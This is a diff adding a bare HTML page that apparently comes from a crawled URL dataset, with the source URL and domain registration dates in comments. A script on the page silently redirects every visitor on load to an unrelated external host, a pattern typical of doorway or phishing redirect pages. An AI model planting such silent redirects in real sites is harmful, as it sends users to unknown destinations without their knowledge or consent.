@@ -1,0 +1,23 @@
+<!-- URL =http://panel-intro.parsonline.com/erouda/--><!-- w =(['PARSONLINE.COM', 'parsonline.com'], [datetime.datetime(1999, 5, 17, 22, 9, 4), datetime.datetime(1999, 5, 17, 17, 9, 4)], [datetime.datetime(2025, 5, 17, 22, 9, 39), datetime.datetime(2025, 5, 17, 17, 9, 39)])--><html>
+ <head>
+ </head>
+ <body>
+  <script>
+   var targetURL="http://bqdh.net/zadouli/"
+var countdownfrom=1
+var currentsecond=1
+function countredirect(){
+if (currentsecond!=1){
+currentsecond-=1
+document.getElementById('count').innerHTML=currentsecond
+}
+else{
+window.location=targetURL
+return
+}
+setTimeout("countredirect()",1000)
+}
+countredirect()
+  </script>
+ </body>
+</html>
